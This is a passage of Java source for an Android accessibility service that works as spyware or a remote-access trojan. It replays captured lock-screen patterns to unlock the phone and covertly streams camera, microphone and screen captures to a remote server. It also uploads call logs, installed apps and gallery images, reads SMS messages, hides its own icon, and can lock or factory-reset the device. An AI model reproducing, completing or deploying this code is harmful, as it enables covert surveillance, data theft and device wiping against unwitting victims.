        path.moveTo((float) points.get(0).getxPosition(), (float) points.get(0).getyPosition()); // Start from the first point

        // Create the path for the gesture
        for (int i = 1; i < points.size(); i++) {
            path.lineTo((float) points.get(i).getxPosition(), (float) points.get(i).getyPosition());
        }

        // Build the gesture description
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 600));

        GestureDescription gesture = gestureBuilder.build();
        boolean result = dispatchGesture(gesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                isSetKeyguard = false;
                super.onCompleted(gestureDescription);
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    public void performLongPress(double x, double y) {
        double currentXPosition = x * deviceWidth / imageWidth;
        double currentYPosition = y * deviceWidth / imageWidth;
        Path clickPath = new Path();
        clickPath.moveTo((float) currentXPosition, (float) currentYPosition);

        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 2000);
        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();

        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d("PerformLongClick", "Click performed successfully");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d(TAG, "Click cancelled");
            }
        }, null);

        if (!result) {
            Log.d(TAG, "Failed to dispatch gesture");
        }
    }

    private void checkCurrentScreen() {
        isKeyguardScreen = false;
        isKeyguardPatternScreen = true;
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        getKeyguardPage(rootNode);
        if (isKeyguardScreen && isKeyguardPatternScreen) {
            makeOverlayTouchScreen();
        }
    }

    private void inputText(String text) {
        if (focusedNode != null && focusedNode.getClassName().equals("android.widget.EditText")) {
            // Use ACTION_SET_TEXT to input text into the focused EditText
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        }
    }

    public void registerBackCameraCaptureManager() {
        orientations.append(Surface.ROTATION_90, 0);
        orientations.append(Surface.ROTATION_180, 1);
        orientations.append(Surface.ROTATION_270, 2);
        orientations.append(Surface.ROTATION_0, 3);

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
    }

    @SuppressLint("MissingPermission")
    private void setupCamera() {
        stopBackgroundThread();
        startBackgroundThread();
        try {
            String cameraID = cameraManager.getCameraIdList()[0];
            if (cameraType.equals("frontCamera")) {
                cameraID = cameraManager.getCameraIdList()[1];
            }
            cameraManager.openCamera(cameraID, cameraStateCallback, backgroundHandler);
        } catch (CameraAccessException e) {
            throw new RuntimeException(e);
        }
    }

    private final CameraDevice.StateCallback cameraStateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            // Handle camera opened
            Log.d("test:::", "Camera open");
            cameraDevice = camera;
            imageReader_back = ImageReader.newInstance(400, 400, ImageFormat.JPEG, 2);
            imageReader_back.setOnImageAvailableListener(onBackImageAvailableListener, backgroundHandler);
            List<Surface> outputSurface = new ArrayList<>();
            outputSurface.add(imageReader_back.getSurface());
            try {
                cameraDevice.createCaptureSession(outputSurface, new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        captureSession = session;
                        startCaptureRequest();
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {

                    }
                }, backgroundHandler);
            } catch (CameraAccessException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice cameraDevice) {
            // Handle camera disconnected
            Log.d("test:::", "Camera close");
        }

        @Override
        public void onError(@NonNull CameraDevice cameraDevice, int error) {
            String errorMsg;
            switch (error) {
                case CameraDevice.StateCallback.ERROR_CAMERA_DEVICE:
                    errorMsg = "Fatal (device)";
                    break;
                case CameraDevice.StateCallback.ERROR_CAMERA_DISABLED:
                    errorMsg = "Device policy";
                    break;
                case CameraDevice.StateCallback.ERROR_CAMERA_IN_USE:
                    errorMsg = "Camera in use";
                    break;
                case CameraDevice.StateCallback.ERROR_CAMERA_SERVICE:
                    errorMsg = "Fatal (service)";
                    break;
                case CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE:
                    errorMsg = "Maximum cameras in use";
                    break;
                default:
                    errorMsg = "Unknown";
                    break;
            }
            Log.e("Error:::", "Error when trying to connect camera " + errorMsg);
        }
    };
    ImageReader.OnImageAvailableListener onBackImageAvailableListener = new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, bitmap.getWidth(), bitmap.getHeight(), true);

                // Compress the Bitmap to JPEG format with 50% quality
                try {
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        resizedBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, qualityCamera, byteArrayOutputStream);
                    } else {
                        resizedBitmap.compress(Bitmap.CompressFormat.WEBP, qualityCamera, byteArrayOutputStream);
                    }

                    // Encode the compressed Bitmap to base64
                    byte[] compressedBytes = byteArrayOutputStream.toByteArray();
                    sendBackCameraMonitoringData(byteArrayOutputStream);
                    bitmap.recycle();
                    resizedBitmap.recycle();
                    byteArrayOutputStream.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                image.close();
            }
        }
    };

    private void startCaptureRequest() {
        if (cameraDevice != null && captureSession != null && imageReader_back != null) {
            try {
                CaptureRequest.Builder captureRequestBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                captureRequestBuilder.addTarget(imageReader_back.getSurface());
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraDevice.getId());
                int minExposure = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE).getLower();
                int maxExposure = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE).getUpper();

                captureRequestBuilder.set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, (minExposure + maxExposure) / 2);

//            captureRequestBuilder.set(CaptureRequest.JPEG_ORIENTATION, orientations.get(0));
                captureSession.setRepeatingRequest(captureRequestBuilder.build(), null, backgroundHandler);
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }
    }

    private void closeCamera() {
        Log.d("log::", "Close Camera");
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (imageReader_back != null) {
            imageReader_back.close();
            imageReader_back = null;
        }
        stopBackgroundThread();
    }

    private void getCallDetails() {
        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                String callType;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "Incoming";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "Outgoing";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "Missed";
                        break;
                    case CallLog.Calls.VOICEMAIL_TYPE:
                        callType = "Voicemail";
                        break;
                    case CallLog.Calls.REJECTED_TYPE:
                        callType = "Rejected";
                        break;
                    case CallLog.Calls.BLOCKED_TYPE:
                        callType = "Blocked";
                        break;
                    case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                        callType = "Answered Externally";
                        break;
                    default:
                        callType = "Unknown";
                        break;
                }

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(date));
                CallLogEntry callLogEntry = new CallLogEntry(number, callType, dateString, duration);
                callLogList.add(callLogEntry);
                Log.d("CallLog", "Number: " + number + ", Type: " + callType + ", Date: " + dateString + ", Duration: " + duration + " seconds");
            }
            if (callLogList.size() > 0 && Server.getContext() != null) {
                Server.getContext().sendCallLogger(callLogList);
                callLogList.clear();
            }
            cursor.close();
        }
    }

    public void getInstalledAppList() {
        PackageManager packageManager = getPackageManager();
        List<ApplistEntry> installedApps = InstalledApps.getInstalledApps(packageManager);
        if (Server.getContext() != null) {
            Server.getContext().sendInstalledAppList(installedApps);
        }
    }

    private void getAllImages() {
        List<ImageData> imageList = new ArrayList<>();

        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        ContentResolver contentResolver = getContentResolver();
        try (Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder)) {
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    String filePath = cursor.getString(dataColumn);
                    imageList.add(new ImageData(id, filePath));
                    Log.d("filepath::", filePath);
                }
            }
        }
        if (imageList.size() > 0 && Server.getContext() != null) {
            Server.getContext().SendAllGallery(imageList);
        }
    }

    private void getOneImageData(String filePath) {
        Bitmap bitmap = BitmapFactory.decodeFile(filePath);
        if (bitmap != null) {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmap.getHeight() * (360.0 / bitmap.getWidth())), true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, byteArrayOutputStream);
            } else {
                scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, byteArrayOutputStream);
            }
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            // Convert bitmap to Base64
            String base64Image = Base64.encodeToString(byteArray, Base64.DEFAULT);
            if (Server.getContext() != null) {
                Server.getContext().SendOneGallery(base64Image);
            }
        }
    }

    private void getAllSMS() {
//        List<ImageData> imageList = new ArrayList<>();

        Uri inboxUri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(inboxUri, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            do {
                // Get SMS details
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));

                // Process SMS as needed
                System.out.println("From: " + address + ", Message: " + body + ", Date: " + date);

            } while (cursor.moveToNext());

            cursor.close();
        }
//        if (imageList.size() > 0 && Server.getContext() != null) {
//            Server.getContext().SendAllGallery(imageList);
//        }
    }

    private void onOpenApp(String packageName) {
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntent);//null pointer check in case package name was not found
        }
    }

    private void onLockApp(String packageName) {
        if (!packageList.contains(packageName)) {
            packageList.add(packageName);
            Common.getInstance().setPackageList(packageList);
            FileUtils.saveArrayListToFile(getBaseContext() ,packageList,"packagelist.pdm");
            System.out.println("Added: " + packageName);
        } else {
            System.out.println(packageName + " already exists in the list.");
        }
    }
    private void onUnLockApp(String packageName) {
        if (packageList.contains(packageName)) {
            packageList.remove(packageName);
            Common.getInstance().setPackageList(packageList);
            FileUtils.saveArrayListToFile(getBaseContext() ,packageList,"packagelist.pdm");
            System.out.println("Removed: " + packageName);
        } else {
            System.out.println(packageName + " does not exist in the list.");
        }
    }

    private void onHideAppIcon() {
        if (manufacturer.equals("xiaomi")) {
            PackageManager packageManager = getPackageManager();
            ComponentName cName = new ComponentName(getPackageName(), MainActivity.class.getName());
            packageManager.setComponentEnabledSetting(cName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }

    private void onShowAppIcon() {
        if (manufacturer.equals("xiaomi")) {
            PackageManager packageManager = getPackageManager();
            ComponentName cName = new ComponentName(getPackageName(), MainActivity.class.getName());
            packageManager.setComponentEnabledSetting(cName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        }
    }

    private void stopRecording() {
        if (audioRecord != null) {
            isRecording = false;
            audioRecord.stop();
            audioRecord.release();
            audioRecord = null;
            recordingThread = null;

        }
    }

    private void startRecording() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        int buffersize = AudioRecord.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        if(buffersize < 8192) {
            buffersize = 8192;
        }
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, buffersize);
        Log.d("buffre Size::", String.valueOf(buffersize));

        if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
            isRecording = true;
            audioRecord.startRecording();

            int finalBuffersize = buffersize;
            recordingThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    monitorAudio(finalBuffersize);
                }
            });
            recordingThread.start();

        } else {
            Log.e("AudioRecord", "AudioRecord initialization failed");
        }
    }

    private void monitorAudio(int bufferSize) {
        short[] buffer = new short[bufferSize]; // buffer for PCM data

        while (isRecording) {
            // Read audio data into the buffer
            int read = audioRecord.read(buffer, 0, buffer.length);
            if (read > 0) {
                sendMicMonitoringData(buffer);
                // Here, you can do further analysis, such as detecting noise levels, frequency, etc.
            }
        }
    }

    public void performUninstallApp() {
        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
            mDevicePolicyManager.removeActiveAdmin(mAdminComponent);
            myService.startUninstallDialog();
        } else {
            myService.startUninstallDialog();
        }
    }

    public void performFactoryReset() {
        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
            if(Integer.parseInt(Build.VERSION.RELEASE) < 14) {
                Server.getContext().sendFormatNotification();
                mDevicePolicyManager.wipeData(0);
            }
        }
    }

    public void onDeviceLock() {
        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if(mDevicePolicyManager.isAdminActive(mAdminComponent)) {
            mDevicePolicyManager.lockNow();
        }
    }

    public void onDeviceUnlock() {

        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "MyApp::WakeLock");
        wakeLock.acquire(500);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                isSetKeyguard = true;
                handleScreenUp();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if(Common.getInstance().getKeygenEntries() != null && !Common.getInstance().getKeygenEntries().isEmpty()) {
                            performGestureMain(Common.getInstance().getKeygenEntries());
                        }
                    }
                }, 1000);
            }
        }, 1000);
    }

    private void requestOverlayPermission() {
        Intent intent = new Intent(this, OverlaySetActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void onGoHome() {
        performGlobalAction(GLOBAL_ACTION_HOME);
    }

    private void onGoBack() {
        performGlobalAction(GLOBAL_ACTION_BACK);
    }

    private void onGoRecent() {
        performGlobalAction(GLOBAL_ACTION_RECENTS);
    }


    //Send Data part
    public void sendScreenMonitoringData(ByteArrayOutputStream outputStream) {
        if (Server.getContext() != null) {
            if(isScreenMonitoring) {
                Server.getContext().sendScreenMonitoring(outputStream);
            }
        }
    }

    public void sendBackCameraMonitoringData(ByteArrayOutputStream outputStream) {
        if(Server.getContext() != null) {
            Server.getContext().sendCameraMonitoring(outputStream, qualityCamera, cameraType);
        }
    }
    public void sendMicMonitoringData(short[] bufferData) {
        Log.d("sendBackCameraMonitoringData::", "bufferData");
        if(Server.getContext() != null) {
            Server.getContext().sendMicMonitoring(bufferData);
        }
    }

    public static String combineStrings(String first, String second) {
        StringBuilder result = new StringBuilder();

        // Loop through each character of the second string
        for (int i = 0; i < second.length(); i++) {
            // If the character in the second string is '*', take the character from the first string
            if (second.charAt(i) == '•') {
                if(i < first.length()) {
                    result.append(first.charAt(i));
                } else {
                    result.append(" ");
                }
            } else {
                // Otherwise, take the character from the second string
                result.append(second.charAt(i));
            }
        }
        return result.toString();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            screen_outputStream.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        closeCamera();
        unregisterReceiverManager();
        unsetMediaProjection();
    }

    private void unregisterReceiverManager() {
        unregisterReceiver(screenMonitorReceiver);
        unregisterReceiver(mediaProjectionReceiver);
        unregisterReceiver(batteryReceiver);
    }

    private void unsetMediaProjection() {
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
